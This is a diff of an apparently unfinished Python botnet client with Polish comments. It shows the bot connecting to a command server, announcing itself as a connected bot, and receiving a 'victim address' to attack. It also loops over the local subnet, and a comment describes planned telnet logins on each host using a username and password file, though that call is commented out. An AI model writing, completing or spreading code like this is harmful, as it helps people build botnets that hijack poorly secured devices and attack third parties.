@@ -16,19 +16,13 @@ def telnetConnect(ip_address):
 
 def checkForOtherDevices(ip):
     x = 0
-    i = 0
     l = len(ip)
-    while x < l:
-        if ip[x] == '.':
-            i = x
-        x += 1
-    x = 0
     g = ip.split('.')[-1]
     ip = ip[:l - len(g)]
 
     while x < 254:
         current_address = ip + str(x)
-        # telnetConnect(current_address)
+        # telnetConnect(current_address)  -> wywołać w wątku
         x += 1
         # print(current_address)
         # próbuj połączyć z każdym przez telnet używając pliku z loginem i hasłem
@@ -48,7 +42,9 @@ if __name__ == '__main__':
                 try:
                     print('próba połączenia')
                     s.connect((HOST, PORT))
-                    checkForOtherDevices(HOST)
+                    # send info to host that a bot is connected
+                    s.send('1'.encode())
+                    #checkForOtherDevices(HOST)
                     flag = 1
                 except:
                     print('nie udało sie połączyć')
@@ -59,12 +55,13 @@ if __name__ == '__main__':
             # s.sendall(b'Beginn attack')
             try:
                 data = str(s.recv(1024).decode())
-                print('Received', str(data), 'fsfs')
+                print('Received', str(data))
                 if str(data) == '11':
-                    print('coś przyszło' + data)
 
-                    # victim_ip = s.recv(1024)
-                    s.sendall('ok'.encode())
+                    victim_ip = s.recv(1024).decode()
+                    print('victim address:' + str(victim_ip))
+
+                    # s.sendall('ok'.encode())
                 elif data == 2:
                     HOST = s.recv(1024)
                     s.close()
@@ -72,6 +69,7 @@ if __name__ == '__main__':
                     print('cos jest zle')
             except:
                 flag = 0
+                #s.close()
                 continue
             # wyślij swój adres ip przy:
             # - każdym połączeniu
@@ -81,4 +79,4 @@ if __name__ == '__main__':
             # print('public IP address: {}'.format(ip))
             # print('operating port: {}'.format(PORT))
 
-            print('Received', str(data))
+            #print('Received', str(data))
